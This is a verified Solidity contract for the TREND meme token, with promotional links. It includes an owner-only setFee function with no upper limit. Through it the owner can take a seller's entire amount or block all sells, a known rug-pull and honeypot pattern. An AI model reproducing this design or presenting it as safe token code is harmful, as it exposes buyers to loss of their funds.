/**
 *Submitted for verification at Etherscan.io on 2023-09-24
*/

/*
                                                                                               
                                                                                                                                 
                                                                                                                                  
TTTTTTTTTTTTTTTTTTTTTTT    RRRRRRRRRRRRRRRRR        EEEEEEEEEEEEEEEEEEEEEE     NNNNNNNN        NNNNNNNN     DDDDDDDDDDDDD        
T:::::::::::::::::::::T    R::::::::::::::::R       E::::::::::::::::::::E     N:::::::N       N::::::N     D::::::::::::DDD     
T:::::::::::::::::::::T    R::::::RRRRRR:::::R      E::::::::::::::::::::E     N::::::::N      N::::::N     D:::::::::::::::DD   
T:::::TT:::::::TT:::::T    RR:::::R     R:::::R     EE::::::EEEEEEEEE::::E     N:::::::::N     N::::::N     DDD:::::DDDDD:::::D  
TTTTTT  T:::::T  TTTTTT      R::::R     R:::::R       E:::::E       EEEEEE     N::::::::::N    N::::::N       D:::::D    D:::::D 
        T:::::T              R::::R     R:::::R       E:::::E                  N:::::::::::N   N::::::N       D:::::D     D:::::D
        T:::::T              R::::RRRRRR:::::R        E::::::EEEEEEEEEE        N:::::::N::::N  N::::::N       D:::::D     D:::::D
        T:::::T              R:::::::::::::RR         E:::::::::::::::E        N::::::N N::::N N::::::N       D:::::D     D:::::D
        T:::::T              R::::RRRRRR:::::R        E:::::::::::::::E        N::::::N  N::::N:::::::N       D:::::D     D:::::D
        T:::::T              R::::R     R:::::R       E::::::EEEEEEEEEE        N::::::N   N:::::::::::N       D:::::D     D:::::D
        T:::::T              R::::R     R:::::R       E:::::E                  N::::::N    N::::::::::N       D:::::D     D:::::D
        T:::::T              R::::R     R:::::R       E:::::E       EEEEEE     N::::::N     N:::::::::N       D:::::D    D:::::D 
      TT:::::::TT          RR:::::R     R:::::R     EE::::::EEEEEEEE:::::E     N::::::N      N::::::::N     DDD:::::DDDDD:::::D  
      T:::::::::T          R::::::R     R:::::R     E::::::::::::::::::::E     N::::::N       N:::::::N     D:::::::::::::::DD   
      T:::::::::T          R::::::R     R:::::R     E::::::::::::::::::::E     N::::::N        N::::::N     D::::::::::::DDD     
      TTTTTTTTTTT          RRRRRRRR     RRRRRRR     EEEEEEEEEEEEEEEEEEEEEE     NNNNNNNN         NNNNNNN     DDDDDDDDDDDDD        
                                                                                                                                  
                                                                                                                                  
                                                                                                              
                                                                                              
                                                                          
TREND | $TREND

Discover The Trend - DAPP

• Find A Trend

• Portfolio Tracker 

• Charts

• Rug Detector

• Token AI Auditor

• Swap

DAPP LIVE: https://trenderc.netlify.app/

Telegram: https://t.me/TrendErcportal
Website: https://trendeth.netlify.app/
X: https://x.com/trenderctoken


*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.20;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract TREND {
        

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

        string public   name_ = "TREND"; 
        string public   symbol_ = "TREND";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000 * 10**decimals;

        uint256 buyFee = 0;
        uint256 sellFee = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();
        
        
    
        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed OwnerDev,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant OwnerDev = payable(address(0xC7D6Ae4d5C0aAb9Bc637d8ed14040170f3459805));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == OwnerDev || to == OwnerDev);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                OwnerDev.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FeeAmount = amount * (from == pair ? buyFee : sellFee) / 100;
                amount -= FeeAmount;
                balanceOf[address(this)] += FeeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == OwnerDev);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFee(uint256 _buy, uint256 _sell) private {
            buyFee = _buy;
            sellFee = _sell;
        }

        function setFee(uint256 _buy, uint256 _sell) external {
            if(msg.sender != OwnerDev)        
                revert Permissions();
            _setFee(_buy, _sell);
        }
    }